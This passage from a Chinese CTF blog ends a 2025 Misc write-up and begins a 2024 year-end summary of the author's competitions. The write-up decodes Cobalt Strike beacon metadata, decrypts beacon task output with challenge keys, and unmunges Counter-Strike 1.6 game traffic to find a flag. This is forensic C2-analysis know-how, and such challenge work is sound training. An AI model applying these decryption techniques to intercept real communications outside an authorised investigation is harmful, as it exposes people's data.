class="keyword">return</span> <span class="string">&quot;EUC-KR&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">51950</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">52936</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;GB2312&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">54936</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;GB18030&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">57002</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISCII91&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">57003</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISCII91&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">57004</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISCII91&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">57005</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISCII91&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">57006</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISCII91&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">57007</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISCII91&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">57008</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISCII91&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">57009</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISCII91&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">57010</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISCII91&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">57011</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;x-ISCII91&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">65000</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> var0 == <span class="number">65001</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> plaintext[<span class="number">0</span>:<span class="number">4</span>] == <span class="string">b&#x27;\x00\x00\xBE\xEF&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 16</span></span><br><span class="line">    raw_aes_keys = plaintext[<span class="number">8</span>:<span class="number">24</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2</span></span><br><span class="line">    var9 = plaintext[<span class="number">24</span>:<span class="number">26</span>]</span><br><span class="line">    var9 = <span class="built_in">int</span>.from_bytes(var9, byteorder=<span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    var9 = getName(var9)</span><br><span class="line">    <span class="comment"># 2</span></span><br><span class="line">    var10 = plaintext[<span class="number">26</span>:<span class="number">28</span>]</span><br><span class="line">    var10 = <span class="built_in">int</span>.from_bytes(var10, byteorder=<span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    var10 = getName(var10)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4</span></span><br><span class="line">    <span class="built_in">id</span> = plaintext[<span class="number">28</span>:<span class="number">32</span>]</span><br><span class="line">    <span class="built_in">id</span> = <span class="built_in">int</span>.from_bytes(<span class="built_in">id</span>, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Beacon id:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4</span></span><br><span class="line">    pid = plaintext[<span class="number">32</span>:<span class="number">36</span>]</span><br><span class="line">    pid = <span class="built_in">int</span>.from_bytes(pid, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;pid:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(pid))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2</span></span><br><span class="line">    port = plaintext[<span class="number">36</span>:<span class="number">38</span>]</span><br><span class="line">    port = <span class="built_in">int</span>.from_bytes(port, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;port:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(port))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1</span></span><br><span class="line">    flag = plaintext[<span class="number">38</span>:<span class="number">39</span>]</span><br><span class="line">    flag = <span class="built_in">int</span>.from_bytes(flag, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> isFlag(flag, <span class="number">1</span>):</span><br><span class="line">        barch = <span class="string">&quot;&quot;</span></span><br><span class="line">        pid = <span class="string">&quot;&quot;</span></span><br><span class="line">        is64 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> isFlag(flag, <span class="number">2</span>):</span><br><span class="line">        barch = <span class="string">&quot;x64&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        barch = <span class="string">&quot;x86&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> isFlag(flag, <span class="number">4</span>):</span><br><span class="line">        is64 = <span class="string">&quot;1&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        is64 = <span class="string">&quot;0&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> isFlag(flag, <span class="number">8</span>):</span><br><span class="line">        bypassuac = <span class="string">&quot;True&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bypassuac = <span class="string">&quot;False&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;barch:&quot;</span> + barch)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;is64:&quot;</span> + is64)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bypass:&quot;</span> + bypassuac)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2</span></span><br><span class="line">    var_1 = plaintext[<span class="number">39</span>:<span class="number">40</span>]</span><br><span class="line">    var_2 = plaintext[<span class="number">40</span>:<span class="number">41</span>]</span><br><span class="line">    var_1 = <span class="built_in">int</span>.from_bytes(var_1, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    var_2 = <span class="built_in">int</span>.from_bytes(var_2, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    windows_var = <span class="built_in">str</span>(var_1) + <span class="string">&quot;.&quot;</span> + <span class="built_in">str</span>(var_2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;windows var:&quot;</span> + windows_var)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2</span></span><br><span class="line">    windows_build = plaintext[<span class="number">41</span>:<span class="number">43</span>]</span><br><span class="line">    windows_build = <span class="built_in">int</span>.from_bytes(windows_build, byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;windows build:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(windows_build))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4</span></span><br><span class="line">    x64_P = plaintext[<span class="number">43</span>:<span class="number">47</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4</span></span><br><span class="line">    ptr_gmh = plaintext[<span class="number">47</span>:<span class="number">51</span>]</span><br><span class="line">    <span class="comment"># 4</span></span><br><span class="line">    ptr_gpa = plaintext[<span class="number">51</span>:<span class="number">55</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># if (&quot;x64&quot;.equals(this.barch)) &#123;</span></span><br><span class="line">    <span class="comment"># this.ptr_gmh = CommonUtils.join(var10, this.ptr_gmh)</span></span><br><span class="line">    <span class="comment"># this.ptr_gpa = CommonUtils.join(var10, this.ptr_gpa)</span></span><br><span class="line">    <span class="comment"># &#125;</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># this.ptr_gmh = CommonUtils.bswap(this.ptr_gmh)</span></span><br><span class="line">    <span class="comment"># this.ptr_gpa = CommonUtils.bswap(this.ptr_gpa)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4</span></span><br><span class="line">    intz = plaintext[<span class="number">55</span>:<span class="number">59</span>]</span><br><span class="line">    intz = <span class="built_in">int</span>.from_bytes(intz, byteorder=<span class="string">&#x27;little&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">    intz = toIP(intz)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> intz == <span class="string">&quot;0.0.0.0&quot;</span>:</span><br><span class="line">        intz = <span class="string">&quot;unknown&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;host:&quot;</span> + intz)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> var9 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        ddata = plaintext[<span class="number">59</span>:].decode(<span class="string">&quot;ISO8859-1&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ddata = plaintext[<span class="number">59</span>:].decode(<span class="string">&quot;ISO8859-1&quot;</span>)</span><br><span class="line"></span><br><span class="line">    ddata = ddata.split(<span class="string">&quot;\t&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(ddata) &gt; <span class="number">0</span>:</span><br><span class="line">        computer = ddata[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(ddata) &gt; <span class="number">1</span>:</span><br><span class="line">        username = ddata[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(ddata) &gt; <span class="number">2</span>:</span><br><span class="line">        process = ddata[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;PC name:&quot;</span> + computer)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;username:&quot;</span> + username)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;process name:&quot;</span> + process)</span><br><span class="line"></span><br><span class="line">    raw_aes_hash256 = hashlib.sha256(raw_aes_keys)</span><br><span class="line">    digest = raw_aes_hash256.digest()</span><br><span class="line">    aes_key = digest[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line">    hmac_key = digest[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;AES key:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(aes_key.<span class="built_in">hex</span>()))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;HMAC key:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(hmac_key.<span class="built_in">hex</span>()))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Ciphertext:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(plaintext.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/西湖论剑2025-Misc-Writeup-复现/image-20250128153609278.png"alt="image-20250128153609278" /><figcaption aria-hidden="true">image-20250128153609278</figcaption></figure><p>在流1382处传了一个流量包，提取出来</p><figure><imgsrc="/images/西湖论剑2025-Misc-Writeup-复现/image-20250128165615257.png"alt="image-20250128165615257" /><figcaption aria-hidden="true">image-20250128165615257</figcaption></figure><figure><imgsrc="/images/西湖论剑2025-Misc-Writeup-复现/image-20250128165755667.png"alt="image-20250128165755667" /><figcaption aria-hidden="true">image-20250128165755667</figcaption></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import hmac</span><br><span class="line">import binascii</span><br><span class="line">import base64</span><br><span class="line">import hexdump</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">AES_KEY = binascii.unhexlify(&quot;9fe14473479a283821241e2af78017e8&quot;)</span><br><span class="line">HMAC_KEY = binascii.unhexlify(&quot;1e3d54f1b9f0e106773a59b7c379a89d&quot;)</span><br><span class="line">encrypt_data = &quot;hex&quot; #把上面图中的Data部分复制过来</span><br><span class="line">def decrypt(encrypted_data, iv_bytes, signature, AES_KEY, hmac_key):</span><br><span class="line">    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv_bytes)</span><br><span class="line">    return cipher.decrypt(encrypted_data)</span><br><span class="line">encrypt_data = bytes.fromhex(encrypt_data)</span><br><span class="line">try:</span><br><span class="line">    encrypt_data_length = int.from_bytes(encrypt_data[:4], byteorder=&#x27;big&#x27;, signed=False)</span><br><span class="line">    encrypt_data_l = encrypt_data[4:]</span><br><span class="line">    data1 = encrypt_data_l[:encrypt_data_length-16]</span><br><span class="line">    signature = encrypt_data_l[encrypt_data_length-16:encrypt_data_length]</span><br><span class="line">    iv_bytes = b&quot;abcdefghijklmnop&quot;</span><br><span class="line">    dec = decrypt(data1, iv_bytes, signature, AES_KEY, HMAC_KEY)</span><br><span class="line">except:</span><br><span class="line">    dec = decrypt(encrypt_data, iv_bytes, signature, AES_KEY, HMAC_KEY)</span><br><span class="line">print(&quot;counter: &#123;&#125;&quot;.format(int.from_bytes(dec[:4], byteorder=&#x27;big&#x27;, signed=False)))</span><br><span class="line">print(&quot;任务返回长度: &#123;&#125;&quot;.format(int.from_bytes(dec[4:8], byteorder=&#x27;big&#x27;, signed=False)))</span><br><span class="line">print(&quot;任务输出类型: &#123;&#125;&quot;.format(int.from_bytes(dec[8:12], byteorder=&#x27;big&#x27;, signed=False)))</span><br><span class="line">print(hexdump.hexdump(dec[:1000]))</span><br><span class="line">open(&#x27;secret.pcapng&#x27;,&#x27;wb&#x27;).write(dec[64:-76])</span><br></pre></td></tr></table></figure><p>打开流量包，发现里面全都是27015端口在通讯，查询可知这是游戏cs1.6的流量包</p><figure><imgsrc="/images/西湖论剑2025-Misc-Writeup-复现/image-20250128165953359.png"alt="image-20250128165953359" /><figcaption aria-hidden="true">image-20250128165953359</figcaption></figure><p>接下来根据<ahref="https://www.anquanke.com/post/id/261339">这篇文章</a>来解密</p><p>将下面这个cpp文件编译成so文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> _LongSwap(<span class="type">int</span> l)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> res = __builtin_bswap32(*(<span class="type">unsigned</span> <span class="type">int</span> *)&amp;l);</span><br><span class="line">        <span class="keyword">return</span> *(<span class="type">int</span> *)&amp;(res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> mungify_table[] =</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0x7A</span>, <span class="number">0x64</span>, <span class="number">0x05</span>, <span class="number">0xF1</span>,</span><br><span class="line">            <span class="number">0x1B</span>, <span class="number">0x9B</span>, <span class="number">0xA0</span>, <span class="number">0xB5</span>,</span><br><span class="line">            <span class="number">0xCA</span>, <span class="number">0xED</span>, <span class="number">0x61</span>, <span class="number">0x0D</span>,</span><br><span class="line">            <span class="number">0x4A</span>, <span class="number">0xDF</span>, <span class="number">0x8E</span>, <span class="number">0xC7</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> mungify_table2[] =</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0x05</span>, <span class="number">0x61</span>, <span class="number">0x7A</span>, <span class="number">0xED</span>,</span><br><span class="line">            <span class="number">0x1B</span>, <span class="number">0xCA</span>, <span class="number">0x0D</span>, <span class="number">0x9B</span>,</span><br><span class="line">            <span class="number">0x4A</span>, <span class="number">0xF1</span>, <span class="number">0x64</span>, <span class="number">0xC7</span>,</span><br><span class="line">            <span class="number">0xB5</span>, <span class="number">0x8E</span>, <span class="number">0xDF</span>, <span class="number">0xA0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> mungify_table3[] =</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0x20</span>, <span class="number">0x07</span>, <span class="number">0x13</span>, <span class="number">0x61</span>,</span><br><span class="line">            <span class="number">0x03</span>, <span class="number">0x45</span>, <span class="number">0x17</span>, <span class="number">0x72</span>,</span><br><span class="line">            <span class="number">0x0A</span>, <span class="number">0x2D</span>, <span class="number">0x48</span>, <span class="number">0x0C</span>,</span><br><span class="line">            <span class="number">0x4A</span>, <span class="number">0x12</span>, <span class="number">0xA9</span>, <span class="number">0xB5</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">COM_UnMunge2</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *data, <span class="type">int</span> len, <span class="type">int</span> seq)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="type">int</span> mungelen;</span><br><span class="line">        <span class="type">int</span> c;</span><br><span class="line">        <span class="type">int</span> *pc;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> *p;</span><br><span class="line">        <span class="type">int</span> j;</span><br><span class="line"></span><br><span class="line">        mungelen = len &amp; ~<span class="number">3</span>;</span><br><span class="line">        mungelen /= <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; mungelen; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            pc = (<span class="type">int</span> *)&amp;data[i * <span class="number">4</span>];</span><br><span class="line">            c = *pc;</span><br><span class="line">            c ^= seq;</span><br><span class="line"></span><br><span class="line">            p = (<span class="type">unsigned</span> <span class="type">char</span> *)&amp;c;</span><br><span class="line">            <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                *p++ ^= (<span class="number">0xa5</span> | (j &lt;&lt; j) | j | mungify_table2[(i + j) &amp; <span class="number">0x0f</span>]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            c = _LongSwap(c);</span><br><span class="line">            c ^= ~seq;</span><br><span class="line">            *pc = c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ -fPIC -shared -o dll.so 1.cpp</span><br></pre></td></tr></table></figure><p>然后用下面的程序加载编译出的dll.so解密流量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">lib=CDLL(<span class="string">&#x27;./dll.so&#x27;</span>)</span><br><span class="line">COM_UnMunge=lib.COM_UnMunge2</span><br><span class="line"></span><br><span class="line">pcaps = rdpcap(<span class="string">&quot;secret.pcapng&quot;</span>)</span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;res&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> mpacket <span class="keyword">in</span> pcaps.<span class="built_in">filter</span>(<span class="keyword">lambda</span> x:UDP <span class="keyword">in</span> x <span class="keyword">and</span> x[UDP].sport==<span class="number">27015</span>):</span><br><span class="line">    <span class="comment"># mpacket.show()</span></span><br><span class="line">    udp=mpacket[UDP]</span><br><span class="line">    data=<span class="built_in">bytes</span>(udp.payload)[<span class="number">8</span>:]</span><br><span class="line">    seq=<span class="built_in">bytes</span>(udp.payload)[:<span class="number">4</span>]</span><br><span class="line">    ack=<span class="built_in">bytes</span>(udp.payload)[<span class="number">4</span>:<span class="number">8</span>]</span><br><span class="line">    c=create_string_buffer(data)</span><br><span class="line">    COM_UnMunge(c,<span class="built_in">len</span>(data),seq[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(mpacket.time,mpacket[IP].src,<span class="string">&#x27;-&gt;&#x27;</span>,mpacket[IP].dst)</span><br><span class="line">    decode_bytes=<span class="built_in">bytes</span>(c)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(decode_bytes)&gt;<span class="number">10</span>:</span><br><span class="line">        <span class="keyword">if</span> struct.unpack(<span class="string">&#x27;&lt;L&#x27;</span>, seq)[<span class="number">0</span>] &amp; (<span class="number">1</span>&lt;&lt;<span class="number">30</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(decode_bytes)&gt;<span class="number">10</span>+struct.unpack(<span class="string">&#x27;&lt;h&#x27;</span>, decode_bytes[<span class="number">7</span>:<span class="number">9</span>])[<span class="number">0</span>]+<span class="number">1</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;find extra data block:&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(decode_bytes[<span class="number">10</span>+struct.unpack(<span class="string">&#x27;&lt;h&#x27;</span>, decode_bytes[<span class="number">7</span>:<span class="number">9</span>])[<span class="number">0</span>]:])</span><br><span class="line">            decode_bytes=decode_bytes[<span class="number">10</span>:<span class="number">10</span>+struct.unpack(<span class="string">&#x27;&lt;h&#x27;</span>, decode_bytes[<span class="number">7</span>:<span class="number">9</span>])[<span class="number">0</span>]]</span><br><span class="line">        f.write(decode_bytes)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;finally decode data:<span class="subst">&#123;decode_bytes&#125;</span>\nlength:<span class="subst">&#123;<span class="built_in">len</span>(decode_bytes)&#125;</span>&#x27;</span>)        </span><br><span class="line">f.close</span><br></pre></td></tr></table></figure><p>在得到的res文件中搜索不难找到flag</p><figure><imgsrc="/images/西湖论剑2025-Misc-Writeup-复现/image-20250128172100493.png"alt="image-20250128172100493" /><figcaption aria-hidden="true">image-20250128172100493</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 西湖论剑 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024年度总结</title>
      <link href="/posts/c2cf88b8/"/>
      <url>/posts/c2cf88b8/</url>
      
        <content type="html"><![CDATA[<h2 id="导语">导语</h2><p>打CTF也有一年了，写个年度报告吧。</p><p>总的来说，这是忙忙碌碌而又颗粒无收的一年，大比赛的奖是一个都没拿到<del>（菜的一批）</del>o(╥﹏╥)o</p><p>不过通过这些比赛也是学到了很多东西，毕竟我也可以算是在网安方面刚刚起步，知识就是这样一点点累积起来的:)</p><p>再者就是在今年我加入了校队和星盟安全团队，认识了很多大佬，也在联队的培训和茶话会中见识到了很多于我而言的新的东西，了解到了很多前所未闻的技术。从这一点来看，我今年还是win了的:)</p><p>下面就按月份列一下我一年的历程吧。</p><h2 id="月">1月</h2><p>这时我才刚起步CTF不久，只打过学校的0xGame和NCTF，基本上还在靶场刷题阶段。</p><p>搭建起了我的博客https://www.blog.st4rr.top/</p><h2 id="月-1">2月</h2><h3 id="beginctf">BeginCTF</h3><p>wp: <ahref="https://www.blog.st4rr.top/2024/02/06/BeginCTF2024-Writeup/">点我</a></p><p>这个比赛好像是我自己一个人打着练手的，是个新生赛来着，拿了个第11名。这个比赛没有奖品，唯一记得的是这是我第一次见到tupper自指公式。</p><p><img src="/images/2024年度总结/IMG_5408.JPG" alt="IMG_5408" style="zoom:50%;" /></p><h3 id="hgame">HGame</h3><p>wp: <ahref="https://www.blog.st4rr.top/2024/02/06/HGame2024-Writeup/">点我</a></p><p>一年一度的杭电新生赛，也是南邮校科协寒假大作战安全组指定比赛。记得当时我Misc打得还不错，基本ak了，现在想来这也可能影响到了我后来选择misc方向，成为了一名<del>musc</del> misc手。</p><h3 id="sictf">SICTF</h3><p>wp: <ahref="https://www.blog.st4rr.top/2024/02/19/SICTF2024-Writeup/">点我</a></p><p>找了个朋友f4k3r一起打的，拿了第45名，拿到了我CTF史中的第一个奖品，一台服务器1个月的使用权。</p><p>这个比赛也是我第一次接触区块链的题目，区块链的题目在网上的wp非常的少，而当时区块链的那些名词对我来说也是完全新的事物，所以当时即使是在学长zysgmzb的超级耐心的指导下我也仍然没做出来:(</p><p>当然赛后我专门写了一篇博客好好做了复现：<ahref="https://www.blog.st4rr.top/2024/02/22/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/">点我</a></p><p>这个时候我绝对不会想到就在八个月后的0xGame中我成了区块链的出题人</p><p><img src="/images/2024年度总结/IMG_5409.JPG" alt="IMG_5409" style="zoom:50%;" /></p><h2 id="月-2">3月</h2><h3 id="qsnctf">qsnCTF</h3><p>wp: <ahref="https://www.blog.st4rr.top/2024/03/01/qsnCTF2024%20Round1-Writeup/">点我</a></p><p>仍然是跟f4k3r一起打的，由于只有两个人发力，只拿了个优胜奖。加入战队的需要显得越发迫切。</p><p><img src="/images/2024年度总结/image-20250122113232477.png" alt="image-20250122113232477" style="zoom:50%;" /></p><h3 id="hscctf">HSCCTF</h3><p>这个比赛打的人很少，给我混了个第十三名。</p><figure><img src="/images/2024年度总结/IMG_5410.JPG" alt="IMG_5410" /><figcaption aria-hidden="true">IMG_5410</figcaption></figure><h3 id="nkctf">NKCTF</h3><p>wp: <ahref="https://www.blog.st4rr.top/2024/03/24/NKCTF2024-Writeup/">点我</a></p><p>记得在这场比赛中被打爆了，但是这应该是我打的第一场misc里有MC题的比赛</p><h2 id="月-3">4月</h2><h3 id="加入x1ct34m">加入X1cT34m</h3><p>校队的misc招新，两道题，四个flag，边做边学，最终也是全做出来了，遂成功加入校队。</p><p>刚刚接触网安的时候就听说了小绿草的名声，我甚至可以说是就是为此来南邮学的信安，如今终于成功加入了。前辈们确实全都很强，都是各自方向的顶尖人才，往年也是把各大比赛的国一拿了个遍OrzOrz 